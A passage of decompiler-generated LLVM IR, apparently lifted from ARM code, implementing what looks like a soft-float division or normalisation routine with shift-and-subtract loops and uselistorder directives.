  %v0_16a64 = phi i32 [ %v5_16ad4, %dec_label_pc_16ad0 ], [ %v0_16a64.ph, %dec_label_pc_16a60.outer ]
  %v1_16a68 = phi i32 [ %v3_16ad8, %dec_label_pc_16ad0 ], [ %v1_16a68.ph, %dec_label_pc_16a60.outer ]
  %v5_16ae017 = phi i32 [ %v5_16ae0, %dec_label_pc_16ad0 ], [ %v5_16ae017.ph, %dec_label_pc_16a60.outer ]
  %v3_16ae413 = phi i32 [ %v3_16ae4, %dec_label_pc_16ad0 ], [ %v3_16ae413.ph, %dec_label_pc_16a60.outer ]
  %v3_16a60 = icmp uge i32 %v1_16a68, %v3_16ae413
  %v3_16a64 = icmp eq i1 %v3_16a60, false
  %v4_16a64 = sub i32 %v0_16a64, %v5_16ae017
  %v6_16a64 = sext i1 %v3_16a64 to i32
  %v7_16a64 = add i32 %v6_16a64, %v4_16a64
  %v8_16a64 = zext i1 %v3_16a64 to i32
  %v9_16a64 = sub i32 %v7_16a64, %v8_16a64
  %v10_16a64 = icmp ult i32 %v0_16a64, %v9_16a64
  %v11_16a64 = icmp ne i32 %v5_16ae017, -1
  %v12_16a64 = or i1 %v11_16a64, %v10_16a64
  %v13_16a64 = icmp ult i32 %v0_16a64, %v5_16ae017
  %v14_16a64 = select i1 %v3_16a64, i1 %v12_16a64, i1 %v13_16a64
  br i1 %v14_16a64, label %.thread4, label %bb96

bb96:                                             ; preds = %dec_label_pc_16a60
  %v3_16a68 = sub i32 %v1_16a68, %v3_16ae413
  store i32 %v3_16a68, i32* %r6.global-to-local, align 4
  store i32 %v7_16a64, i32* %r5.global-to-local, align 4
  %v3_16a70 = or i32 %v1_16a70, %v0_16ae8
  store i32 %v3_16a70, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16a60, %bb96
  %v1_16ac458 = phi i32 [ %v1_16ac459, %dec_label_pc_16a60 ], [ %v3_16a70, %bb96 ]
  %v1_16a7035 = phi i32 [ %v1_16a70, %dec_label_pc_16a60 ], [ %v3_16a70, %bb96 ]
  %v1_16a8c = phi i32 [ %v1_16a8c41, %dec_label_pc_16a60 ], [ %v3_16a70, %bb96 ]
  %v1_16aa849 = phi i32 [ %v1_16aa850, %dec_label_pc_16a60 ], [ %v3_16a70, %bb96 ]
  %v0_16a80 = phi i32 [ %v0_16a64, %dec_label_pc_16a60 ], [ %v7_16a64, %bb96 ]
  %v1_16a84 = phi i32 [ %v1_16a68, %dec_label_pc_16a60 ], [ %v3_16a68, %bb96 ]
  %v1_16a74 = urem i32 %v5_16ae017, 2
  %v2_16a74 = icmp ne i32 %v1_16a74, 0
  %v3_16a74 = udiv i32 %v5_16ae017, 2
  %v3_16a78 = zext i1 %v2_16a74 to i32
  %v6_16a78 = zext i32 %v3_16ae413 to i64
  %v7_16a78 = sub i32 33, %v3_16ae413
  %v8_16a78 = zext i32 %v7_16a78 to i64
  %v9_16a78 = shl i64 %v6_16a78, %v8_16a78
  %v10_16a78 = sub i32 32, %v3_16ae413
  %v11_16a78 = shl i32 %v3_16a78, %v10_16a78
  %v12_16a78 = zext i32 %v11_16a78 to i64
  %v14_16a78 = or i64 %v12_16a78, %v9_16a78
  %v15_16a78 = trunc i64 %v14_16a78 to i32
  %v3_16a7c = icmp uge i32 %v1_16a84, %v15_16a78
  %v3_16a80 = icmp eq i1 %v3_16a7c, false
  %v4_16a80 = sub i32 %v0_16a80, %v3_16a74
  %v6_16a80 = sext i1 %v3_16a80 to i32
  %v7_16a80 = add i32 %v6_16a80, %v4_16a80
  %v13_16a80 = icmp ult i32 %v0_16a80, %v3_16a74
  %v14_16a80 = or i1 %v13_16a80, %v3_16a80
  br i1 %v14_16a80, label %.thread6, label %bb97

bb97:                                             ; preds = %.thread4
  %v3_16a84 = sub i32 %v1_16a84, %v15_16a78
  store i32 %v3_16a84, i32* %r6.global-to-local, align 4
  store i32 %v7_16a80, i32* %r5.global-to-local, align 4
  %v5_16a8c = udiv i32 %v0_16ae8, 2
  %v6_16a8c = or i32 %v1_16a8c, %v5_16a8c
  store i32 %v6_16a8c, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb97
  %v1_16ac457 = phi i32 [ %v1_16ac458, %.thread4 ], [ %v6_16a8c, %bb97 ]
  %v1_16a7034 = phi i32 [ %v1_16a7035, %.thread4 ], [ %v6_16a8c, %bb97 ]
  %v1_16a8c45 = phi i32 [ %v1_16a8c, %.thread4 ], [ %v6_16a8c, %bb97 ]
  %v1_16aa8 = phi i32 [ %v1_16aa849, %.thread4 ], [ %v6_16a8c, %bb97 ]
  %v0_16a9c = phi i32 [ %v0_16a80, %.thread4 ], [ %v7_16a80, %bb97 ]
  %v1_16aa0 = phi i32 [ %v1_16a84, %.thread4 ], [ %v3_16a84, %bb97 ]
  %v1_16a90 = urem i32 %v3_16a74, 2
  %v2_16a90 = icmp ne i32 %v1_16a90, 0
  %v3_16a90 = udiv i32 %v5_16ae017, 4
  %v3_16a94 = zext i1 %v2_16a90 to i32
  %v6_16a94 = and i64 %v14_16a78, 4294967295
  %v7_16a94 = sub i32 33, %v15_16a78
  %v8_16a94 = zext i32 %v7_16a94 to i64
  %v9_16a94 = shl i64 %v6_16a94, %v8_16a94
  %v10_16a94 = sub i32 32, %v15_16a78
  %v11_16a94 = shl i32 %v3_16a94, %v10_16a94
  %v12_16a94 = zext i32 %v11_16a94 to i64
  %v14_16a94 = or i64 %v12_16a94, %v9_16a94
  %v15_16a94 = trunc i64 %v14_16a94 to i32
  %v3_16a98 = icmp uge i32 %v1_16aa0, %v15_16a94
  %v3_16a9c = icmp eq i1 %v3_16a98, false
  %v4_16a9c = sub i32 %v0_16a9c, %v3_16a90
  %v6_16a9c = sext i1 %v3_16a9c to i32
  %v7_16a9c = add i32 %v6_16a9c, %v4_16a9c
  %v13_16a9c = icmp ult i32 %v0_16a9c, %v3_16a90
  %v14_16a9c = or i1 %v13_16a9c, %v3_16a9c
  br i1 %v14_16a9c, label %.thread8, label %bb98

bb98:                                             ; preds = %.thread6
  %v3_16aa0 = sub i32 %v1_16aa0, %v15_16a94
  store i32 %v3_16aa0, i32* %r6.global-to-local, align 4
  store i32 %v7_16a9c, i32* %r5.global-to-local, align 4
  %v5_16aa8 = udiv i32 %v0_16ae8, 4
  %v6_16aa8 = or i32 %v1_16aa8, %v5_16aa8
  store i32 %v6_16aa8, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb98
  %v1_16ac4 = phi i32 [ %v1_16ac457, %.thread6 ], [ %v6_16aa8, %bb98 ]
  %v1_16a7033 = phi i32 [ %v1_16a7034, %.thread6 ], [ %v6_16aa8, %bb98 ]
  %v1_16a8c44 = phi i32 [ %v1_16a8c45, %.thread6 ], [ %v6_16aa8, %bb98 ]
  %v1_16aa853 = phi i32 [ %v1_16aa8, %.thread6 ], [ %v6_16aa8, %bb98 ]
  %v0_16ab8 = phi i32 [ %v0_16a9c, %.thread6 ], [ %v7_16a9c, %bb98 ]
  %v1_16abc = phi i32 [ %v1_16aa0, %.thread6 ], [ %v3_16aa0, %bb98 ]
  %v1_16aac = urem i32 %v3_16a90, 2
  %v2_16aac = icmp ne i32 %v1_16aac, 0
  %v3_16aac = udiv i32 %v5_16ae017, 8
  %v3_16ab0 = zext i1 %v2_16aac to i32
  %v6_16ab0 = and i64 %v14_16a94, 4294967295
  %v7_16ab0 = sub i32 33, %v15_16a94
  %v8_16ab0 = zext i32 %v7_16ab0 to i64
  %v9_16ab0 = shl i64 %v6_16ab0, %v8_16ab0
  %v10_16ab0 = sub i32 32, %v15_16a94
  %v11_16ab0 = shl i32 %v3_16ab0, %v10_16ab0
  %v12_16ab0 = zext i32 %v11_16ab0 to i64
  %v14_16ab0 = or i64 %v12_16ab0, %v9_16ab0
  %v15_16ab0 = trunc i64 %v14_16ab0 to i32
  %v3_16ab4 = icmp uge i32 %v1_16abc, %v15_16ab0
  %v3_16ab8 = icmp eq i1 %v3_16ab4, false
  %v4_16ab8 = sub i32 %v0_16ab8, %v3_16aac
  %v6_16ab8 = sext i1 %v3_16ab8 to i32
  %v7_16ab8 = add i32 %v6_16ab8, %v4_16ab8
  %v13_16ab8 = icmp ult i32 %v0_16ab8, %v3_16aac
  %v14_16ab8 = or i1 %v13_16ab8, %v3_16ab8
  br i1 %v14_16ab8, label %.thread10, label %bb100

bb100:                                            ; preds = %.thread8
  %v3_16abc = sub i32 %v1_16abc, %v15_16ab0
  store i32 %v3_16abc, i32* %r6.global-to-local, align 4
  store i32 %v7_16ab8, i32* %r5.global-to-local, align 4
  %v5_16ac4 = udiv i32 %v0_16ae8, 8
  %v6_16ac4 = or i32 %v1_16ac4, %v5_16ac4
  store i32 %v6_16ac4, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb100
  %v1_16ad4 = phi i32 [ %v1_16abc, %.thread8 ], [ %v3_16abc, %bb100 ]
  %v0_16ad0 = phi i32 [ %v0_16ab8, %.thread8 ], [ %v7_16ab8, %bb100 ]
  %v2_16b0c = phi i32 [ %v1_16ac4, %.thread8 ], [ %v6_16ac4, %bb100 ]
  %v1_16a7032 = phi i32 [ %v1_16a7033, %.thread8 ], [ %v6_16ac4, %bb100 ]
  %v1_16a8c43 = phi i32 [ %v1_16a8c44, %.thread8 ], [ %v6_16ac4, %bb100 ]
  %v1_16aa852 = phi i32 [ %v1_16aa853, %.thread8 ], [ %v6_16ac4, %bb100 ]
  %v2_16ac8 = or i32 %v0_16ad0, %v1_16ad4
  %v4_16ac8 = icmp eq i32 %v2_16ac8, 0
  br i1 %v4_16ac8, label %dec_label_pc_16b08, label %dec_label_pc_16ad0

dec_label_pc_16ad0:                               ; preds = %.thread10
  %v3_16ad0 = mul i32 %v0_16ad0, 16
  %v4_16ad4 = udiv i32 %v1_16ad4, 268435456
  %v5_16ad4 = or i32 %v3_16ad0, %v4_16ad4
  store i32 %v5_16ad4, i32* %r5.global-to-local, align 4
  %v3_16ad8 = mul i32 %v1_16ad4, 16
  store i32 %v3_16ad8, i32* %r6.global-to-local, align 4
  %v3_16adc = mul nuw i32 %v3_16aac, 8
  %v4_16ae0 = udiv i32 %v15_16ab0, 536870912
  %v5_16ae0 = or i32 %v4_16ae0, %v3_16adc
  %v3_16ae4 = mul i32 %v15_16ab0, 8
  %v3_16ae8 = udiv i32 %v0_16ae8, 16
  store i32 %v3_16ae8, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16ae8, 16
  br i1 %tmp, label %dec_label_pc_16af0, label %dec_label_pc_16a60

dec_label_pc_16af0:                               ; preds = %dec_label_pc_16ad0
  %v1_16af0 = and i32 %v1_16b0c.ph, 1048576
  %v2_16af0 = icmp eq i32 %v1_16af0, 0
  br i1 %v2_16af0, label %dec_label_pc_16af8, label %.thread11.loopexit

dec_label_pc_16af8:                               ; preds = %dec_label_pc_16af0
  %v2_16af8 = or i32 %v2_16b0c, %v1_16b0c.ph
  store i32 %v2_16af8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16a60.outer

dec_label_pc_16b08:                               ; preds = %.thread10
  store i32 %v15_16ab0, i32* %r2.global-to-local, align 4
  store i32 %v3_16aac, i32* %r3.global-to-local, align 4
  %v1_16b08 = and i32 %v1_16b0c.ph, 1048576
  %v2_16b08 = icmp eq i32 %v1_16b08, 0
  br i1 %v2_16b08, label %bb101, label %.thread11

bb101:                                            ; preds = %dec_label_pc_16b08
  %v3_16b0c = or i32 %v2_16b0c, %v1_16b0c.ph
  store i32 %v3_16b0c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_16af0
  store i32 %v3_16ae4, i32* %r2.global-to-local, align 4
  store i32 %v5_16ae0, i32* %r3.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_16b08, %bb101
  %v1_16b14 = add nsw i32 %v4_16a34, 515
  store i32 %v1_16b14, i32* %ip.global-to-local, align 4
  %v2_16b14 = icmp ugt i32 %v1_16a38, 252
  %v7_16b14 = icmp eq i32 %v1_16a38, 253
  %v2_16b18 = xor i1 %v7_16b14, true
  %v3_16b18 = and i1 %v2_16b14, %v2_16b18
  br i1 %v3_16b18, label %bb102, label %bb103

bb102:                                            ; preds = %.thread11
  %v6_16b18 = icmp ugt i32 %v1_16b14, 1791
  %v11_16b18 = icmp eq i32 %v1_16b14, 1792
  br label %bb103

bb103:                                            ; preds = %.thread11, %bb102
  %v1_16b1c = phi i1 [ %v7_16b14, %.thread11 ], [ %v11_16b18, %bb102 ]
  %v0_16b1c = phi i1 [ %v2_16b14, %.thread11 ], [ %v6_16b18, %bb102 ]
  %v2_16b1c = xor i1 %v1_16b1c, true
  %v3_16b1c = and i1 %v0_16b1c, %v2_16b1c
  call void @__pseudo_cond_branch(i1 %v3_16b1c, i32 ptrtoint (i32* @global_var_16830.740 to i32))
  %v0_16b20 = load i32, i32* %r5.global-to-local, align 4
  %v1_16b20 = load i32, i32* %r3.global-to-local, align 4
  %v2_16b20 = sub i32 %v0_16b20, %v1_16b20
  store i32 %v2_16b20, i32* %ip.global-to-local, align 4
  %v3_16b20 = icmp uge i32 %v0_16b20, %v1_16b20
  %v9_16b20 = icmp eq i32 %v0_16b20, %v1_16b20
  br i1 %v9_16b20, label %bb104, label %.thread12

bb104:                                            ; preds = %bb103
  %v1_16b24 = load i32, i32* %r6.global-to-local, align 4
  %v2_16b24 = load i32, i32* %r2.global-to-local, align 4
  %v3_16b24 = sub i32 %v1_16b24, %v2_16b24
  store i32 %v3_16b24, i32* %ip.global-to-local, align 4
  %v4_16b24 = icmp uge i32 %v1_16b24, %v2_16b24
  %v10_16b24 = icmp eq i32 %v1_16b24, %v2_16b24
  br i1 %v10_16b24, label %bb105, label %.thread12

bb105:                                            ; preds = %bb104
  %v1_16b28 = load i32, i32* %r0.global-to-local, align 4
  %v2_16b28 = urem i32 %v1_16b28, 2
  %v3_16b28 = icmp ne i32 %v2_16b28, 0
  %v4_16b28 = udiv i32 %v1_16b28, 2
  store i32 %v4_16b28, i32* %ip.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb103, %bb104, %bb105
  %v1_16b2c = phi i1 [ %v3_16b20, %bb103 ], [ %v4_16b24, %bb104 ], [ %v3_16b28, %bb105 ]
  %v0_16b2c = load i32, i32* %r0.global-to-local, align 4
  %v2_16b2c = zext i1 %v1_16b2c to i32
  %v3_16b2c = add i32 %v2_16b2c, %v0_16b2c
  store i32 %v3_16b2c, i32* %r0.global-to-local, align 4
  %v0_16b30 = load i32, i32* %r1.global-to-local, align 4
  %v1_16b30 = load i32, i32* %r4.global-to-local, align 4
  %v2_16b30 = and i32 %v1_16b30, 4096
  %v3_16b30 = icmp ne i32 %v2_16b30, 0
  %v4_16b30 = mul i32 %v1_16b30, 1048576
  %v6_16b30 = add i32 %v4_16b30, %v0_16b30
  %v7_16b30 = zext i1 %v3_16b30 to i32
  %v8_16b30 = add i32 %v7_16b30, %v6_16b30
  store i32 %v8_16b30, i32* %r1.global-to-local, align 4
  %v2_16b34 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16b34, i32* %r4.global-to-local, align 4
  store i32 %v6_169d4, i32* %r5.global-to-local, align 4
  store i32 %v9_169d4, i32* %r6.global-to-local, align 4
  ret i32 %v3_16b2c

dec_label_pc_16b3c:                               ; preds = %dec_label_pc_169f4
  %v1_16b3c = and i32 %v2_169f8, -2147483648
  %v4_16b40 = urem i32 %v1_169e0, 1048576
  %v5_16b40 = or i32 %v1_16b3c, %v4_16b40
  store i32 %v5_16b40, i32* %r1.global-to-local, align 4
  %v6_16b44 = add nsw i32 %v2_169f4, 1023
  store i32 %v6_16b44, i32* %r4.global-to-local, align 4
  %v8_16b44 = sub nsw i32 0, %v2_169f4
  %v9_16b44 = and i32 %v6_16b44, %v8_16b44
  %v11_16b44 = icmp slt i32 %v2_169f4, -1023
  %v12_16b44 = icmp eq i32 %v6_16b44, 0
  %v7_16b48 = icmp sgt i32 %v2_169f4, -1023
  br i1 %v7_16b48, label %bb106, label %bb107

bb106:                                            ; preds = %dec_label_pc_16b3c
  %v10_16b48 = sub nsw i32 1024, %v2_169f4
  store i32 %v10_16b48, i32* %r5.global-to-local, align 4
  %v14_16b48 = and i32 %v10_16b48, %v6_16b44
  %v16_16b48 = icmp slt i32 %v10_16b48, 0
  %v17_16b48 = icmp eq i32 %v6_16b44, 2047
  br label %bb107

bb107:                                            ; preds = %dec_label_pc_16b3c, %bb106
  %v3_16b54.in = phi i32 [ %v9_16b44, %dec_label_pc_16b3c ], [ %v14_16b48, %bb106 ]
  %v2_16b54 = phi i1 [ %v11_16b44, %dec_label_pc_16b3c ], [ %v16_16b48, %bb106 ]
  %v1_16b54 = phi i1 [ %v12_16b44, %dec_label_pc_16b3c ], [ %v17_16b48, %bb106 ]
  %v3_16b54 = icmp slt i32 %v3_16b54.in, 0
  %v3_16b4c = xor i1 %v3_16b54, %v2_16b54
  %v4_16b4c = or i1 %v1_16b54, %v3_16b4c
  br i1 %v4_16b4c, label %.thread, label %bb108

bb108:                                            ; preds = %bb107
  %v9_16b4c84 = mul i32 %v6_16b44, 1048576
  %v10_16b4c85 = or i32 %v9_16b4c84, %v5_16b40
  store i32 %v10_16b4c85, i32* %r1.global-to-local, align 4
  store i32 %v3_169d4, i32* %r4.global-to-local, align 4
  store i32 %v6_169d4, i32* %r5.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb107, %bb108
  %v0_16b54 = phi i32 [ %v12_169d4, %bb108 ], [ %v1_16b3c, %bb107 ]
  %v6_16b54 = xor i1 %v4_16b4c, true
  call void @__pseudo_cond_branch(i1 %v6_16b54, i32 %v0_16b54)
  %v0_16b58 = load i32, i32* %r1.global-to-local, align 4
  %v1_16b58 = or i32 %v0_16b58, 1048576
  store i32 %v1_16b58, i32* @r1, align 4
  %v0_16b60 = load i32, i32* %r4.global-to-local, align 4
  %v1_16b60 = add i32 %v0_16b60, -1
  store i32 %v1_16b60, i32* @r4, align 4
  %v3_16b60 = sub i32 0, %v0_16b60
  %v4_16b60 = and i32 %v0_16b60, %v3_16b60
  %v5_16b60 = icmp slt i32 %v4_16b60, 0
  store i1 %v5_16b60, i1* @cpsr_v, align 1
  %v6_16b60 = icmp slt i32 %v1_16b60, 0
  store i1 %v6_16b60, i1* @cpsr_n, align 1
  %v7_16b60 = icmp eq i32 %v0_16b60, 1
  store i1 %v7_16b60, i1* @cpsr_z, align 1
  %v0_16b64 = call i32 @function_16830()
  store i32 %v0_16b64, i32* @r0, align 4
  %v0_16b6c = call i32 @function_16830()
  store i32 %v0_16b6c, i32* @r0, align 4
  %v0_16b70.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_16b74.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16b70

dec_label_pc_16b70:                               ; preds = %.thread1, %.thread2, %bb91, %.thread
  %v4_16b70.pre-phi = phi i32 [ %v5_169e4, %.thread1 ], [ %.pre145.pre-phi, %.thread2 ], [ %v5_169e4, %bb91 ], [ %v5_169e4, %.thread ]
  %v0_16b74 = phi i32 [ %v5_169e0, %.thread1 ], [ %v5_169e0, %.thread2 ], [ %v5_169e0, %bb91 ], [ %v0_16b74.pre, %.thread ]
  %v2_16b78 = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb91 ], [ %v0_16b70.pre, %.thread ]
  %v5_16b70 = and i32 %v2_16b78, %v4_16b70.pre-phi
  store i32 %v5_16b70, i32* @r5, align 4
  %v4_16b74 = icmp eq i32 %v2_16b78, %v0_16b74
  br i1 %v4_16b74, label %bb109, label %bb110

bb109:                                            ; preds = %dec_label_pc_16b70
  %v5_16b78 = icmp eq i32 %v5_16b70, %v2_16b78
  br label %bb110

bb110:                                            ; preds = %dec_label_pc_16b70, %bb109
  %v0_16b7c = phi i1 [ false, %dec_label_pc_16b70 ], [ %v5_16b78, %bb109 ]
  call void @__pseudo_cond_branch(i1 %v0_16b7c, i32 ptrtoint (i32* @global_var_169c4.742 to i32))
  %v0_16b80 = load i32, i32* @r4, align 4
  %v1_16b80 = load i32, i32* %ip.global-to-local, align 4
  %v4_16b80 = icmp eq i32 %v1_16b80, %v0_16b80
  br i1 %v4_16b80, label %dec_label_pc_16b88, label %dec_label_pc_16ba4

dec_label_pc_16b88:                               ; preds = %bb110
  %v0_16b88 = load i32, i32* @r0, align 4
  %v1_16b88 = load i32, i32* @r1, align 4
  %v4_16b88 = mul i32 %v1_16b88, 4096
  %v5_16b88 = or i32 %v4_16b88, %v0_16b88
  store i32 %v5_16b88, i32* %r4.global-to-local, align 4
  %v1_16b8c = icmp ne i32 %v5_16b88, 0
  call void @__pseudo_cond_branch(i1 %v1_16b8c, i32 ptrtoint (i32* @global_var_169c4.742 to i32))
  %v0_16b90 = load i32, i32* @r5, align 4
  %v1_16b90 = load i32, i32* %ip.global-to-local, align 4
  %v1_16b94 = icmp ne i32 %v1_16b90, %v0_16b90
  call void @__pseudo_cond_branch(i1 %v1_16b94, i32 ptrtoint (i32* @global_var_169a8.743 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_16ba0 = call i32 @function_169c4(i32 %arg3, i32 %arg4)
  store i32 %v2_16ba0, i32* @r0, align 4
  %v1_16ba4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16ba4

dec_label_pc_16ba4:                               ; preds = %bb110, %dec_label_pc_16b88
  %v1_16ba4 = phi i32 [ %v1_16b80, %bb110 ], [ %v1_16ba4.pre, %dec_label_pc_16b88 ]
  %v0_16ba4 = load i32, i32* @r5, align 4
  %v4_16ba4 = icmp eq i32 %v0_16ba4, %v1_16ba4
  br i1 %v4_16ba4, label %dec_label_pc_16bac, label %dec_label_pc_16ba4.dec_label_pc_16bc0_crit_edge

dec_label_pc_16ba4.dec_label_pc_16bc0_crit_edge:  ; preds = %dec_label_pc_16ba4
  %v0_16bc0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_16bc0

dec_label_pc_16bac:                               ; preds = %dec_label_pc_16ba4
  %v4_16bac = mul i32 %arg4, 4096
  %v5_16bac = or i32 %v4_16bac, %arg3
  store i32 %v5_16bac, i32* %r5.global-to-local, align 4
  %v7_16bac = icmp eq i32 %v5_16bac, 0
  call void @__pseudo_cond_branch(i1 %v7_16bac, i32 ptrtoint (i32* @global_var_16958.744 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_16bbc = call i32 @function_169c4(i32 %arg3, i32 %arg4)
  store i32 %v2_16bbc, i32* @r0, align 4
  br label %dec_label_pc_16bc0

dec_label_pc_16bc0:                               ; preds = %dec_label_pc_16ba4.dec_label_pc_16bc0_crit_edge, %dec_label_pc_16bac
  %v0_16bc0 = phi i32 [ %v0_16bc0.pre, %dec_label_pc_16ba4.dec_label_pc_16bc0_crit_edge ], [ %v2_16bbc, %dec_label_pc_16bac ]
  %v1_16bc0 = load i32, i32* @r1, align 4
  %v3_16bc0 = mul i32 %v1_16bc0, 2
  %v4_16bc0 = or i32 %v3_16bc0, %v0_16bc0
  store i32 %v4_16bc0, i32* %r6.global-to-local, align 4
  %v6_16bc0 = icmp eq i32 %v4_16bc0, 0
  br i1 %v6_16bc0, label %dec_label_pc_16bc0._crit_edge, label %bb111

dec_label_pc_16bc0._crit_edge:                    ; preds = %dec_label_pc_16bc0
  %.pre = mul i32 %arg4, 2
  %.pre80 = or i32 %.pre, %arg3
  br label %bb112

bb111:                                            ; preds = %dec_label_pc_16bc0
  %v4_16bc4 = mul i32 %arg4, 2
  %v5_16bc4 = or i32 %v4_16bc4, %arg3
  store i32 %v5_16bc4, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_16bc4, 0
  br label %bb112

bb112:                                            ; preds = %dec_label_pc_16bc0._crit_edge, %bb111
  %v4_16bd4.pre-phi = phi i32 [ %.pre80, %dec_label_pc_16bc0._crit_edge ], [ %v5_16bc4, %bb111 ]
  %v0_16bc8 = phi i1 [ false, %dec_label_pc_16bc0._crit_edge ], [ %phitmp, %bb111 ]
  call void @__pseudo_cond_branch(i1 %v0_16bc8, i32 ptrtoint (i32* @global_var_168f0.745 to i32))
  %v0_16bcc = load i32, i32* @r0, align 4
  %v1_16bcc = load i32, i32* @r1, align 4
  %v3_16bcc = mul i32 %v1_16bcc, 2
  %v4_16bcc = or i32 %v3_16bcc, %v0_16bcc
  store i32 %v4_16bcc, i32* %r4.global-to-local, align 4
  %v1_16bd0 = icmp ne i32 %v4_16bcc, 0
  call void @__pseudo_cond_branch(i1 %v1_16bd0, i32 ptrtoint (i32* @global_var_169a8.743 to i32))
  store i32 %v4_16bd4.pre-phi, i32* %r5.global-to-local, align 4
  %v1_16bd8 = icmp ne i32 %v4_16bd4.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_16bd8, i32 ptrtoint (i32* @global_var_16958.744 to i32))
  %v0_16bdc = load i32, i32* @r0, align 4
  %v1_16bdc = load i32, i32* @r1, align 4
  %v2_16bdc = call i32 @function_169c4(i32 %v0_16bdc, i32 %v1_16bdc)
  store i32 %v2_16bdc, i32* %r0.global-to-local, align 4
  ret i32 %v2_16bdc

; uselistorder directives
  uselistorder i32 %v5_16bc4, { 1, 0, 2 }
  uselistorder i32 %v1_16b80, { 1, 0 }
  uselistorder i32 %v1_16b60, { 1, 0 }
  uselistorder i32 %v0_16b60, { 3, 1, 0, 2 }
  uselistorder i32 %v10_16b48, { 2, 0, 1 }
  uselistorder i32 %v6_16b44, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_16b3c, { 1, 0 }
  uselistorder i32 %v2_16b24, { 1, 0, 2 }
  uselistorder i32 %v1_16b24, { 1, 0, 2 }
  uselistorder i32 %v1_16b20, { 1, 0, 2 }
  uselistorder i32 %v0_16b20, { 1, 0, 2 }
  uselistorder i1 %v7_16b14, { 1, 0 }
  uselistorder i32 %v2_16af8, { 1, 0 }
  uselistorder i32 %v3_16ae4, { 2, 1, 0 }
  uselistorder i32 %v3_16ad8, { 0, 2, 1 }
  uselistorder i32 %v5_16ad4, { 2, 0, 1 }
  uselistorder i32 %v6_16ac4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_16ab0, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_16aac, { 3, 0, 2, 1 }
  uselistorder i32 %v0_16ab8, { 0, 2, 1 }
  uselistorder i32 %v1_16ac4, { 1, 0 }
  uselistorder i32 %v6_16aa8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_16a94, { 1, 2, 0, 3 }
  uselistorder i32 %v3_16a90, { 0, 2, 1 }
  uselistorder i32 %v0_16a9c, { 0, 2, 1 }
  uselistorder i32 %v1_16aa8, { 1, 0 }
  uselistorder i32 %v6_16a8c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_16a78, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16a80, { 0, 2, 1 }
  uselistorder i32 %v1_16a8c, { 1, 0 }
  uselistorder i32 %v3_16a70, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_16a64, { 1, 2, 0 }
  uselistorder i32 %v3_16ae413, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_16ae017, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_16a64, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16a70, { 1, 0 }
  uselistorder i32 %storemerge133, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_16b0c.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_16a50, { 1, 0 }
  uselistorder i32 %v0_16a54, { 1, 0 }
  uselistorder i32 %v3_16a40, { 1, 0 }
  uselistorder i1 %v1_16a34, { 1, 0 }
  uselistorder i32 %v3_16a24, { 2, 3, 1, 0 }
  uselistorder i32 %v5_16a20, { 3, 2, 1, 0 }
  uselistorder i32 %v3_16a18, { 2, 1, 0 }
  uselistorder i32 %v5_16a14, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_169f4, { 3, 1, 2, 0, 4, 7, 6, 5, 8 }
  uselistorder i32 %v6_169e4, { 2, 3, 1, 0 }
  uselistorder i32 %v5_169e4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_169e0, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_169e0, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_169d4, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r2.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 9, 10, 2, 3, 6, 4, 5, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 7, 8, 2, 4, 5, 6, 9, 3 }
  uselistorder i32* %ip.global-to-local, { 7, 5, 6, 8, 0, 1, 2, 3, 4, 10, 9 }
  uselistorder i32 (i32, i32)* @function_169c4, { 2, 1, 0 }
  uselistorder i32 ()* @function_16830, { 1, 0 }
  uselistorder i1* @cpsr_n, { 1, 2, 3, 4, 5, 0 }
